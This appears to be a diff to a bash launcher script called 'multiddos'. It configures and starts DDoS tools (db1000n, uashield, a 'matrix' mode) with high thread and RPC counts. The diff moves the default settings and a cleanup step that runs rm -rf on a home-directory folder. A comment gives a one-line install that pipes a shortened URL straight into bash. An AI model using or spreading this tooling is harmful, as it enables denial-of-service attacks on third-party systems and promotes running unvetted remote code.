@@ -1,6 +1,18 @@
 #!/bin/bash
 # curl -L tiny.one/multiddos | bash && tmux a
 
+cd ~
+rm -rf multiddos
+mkdir multiddos
+cd multiddos
+
+db1000n="off"
+uashield="off"
+matrix="off"
+threads="-t 1000"
+rpc="--rpc 2000"
+debug="--debug"
+
 launch () {
 if [ ! -f "/usr/local/bin/gotop" ]; then
     curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
@@ -46,12 +58,6 @@ EOF
 exit
 }
 
-db1000n="off"
-uashield="off"
-matrix="off"
-threads="-t 1000"
-rpc="--rpc 2000"
-debug="--debug"
 if [[ "$1" = ""  ]]; then db1000n="on"; launch; fi
 
 while [ "$1" != "" ]; do
@@ -64,11 +70,6 @@ while [ "$1" != "" ]; do
         *  )   usage;   exit ;;
     esac
 done
-
-cd ~
-rm -rf multiddos
-mkdir multiddos
-cd multiddos
 
 # sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
 sudo apt-get update -q -y
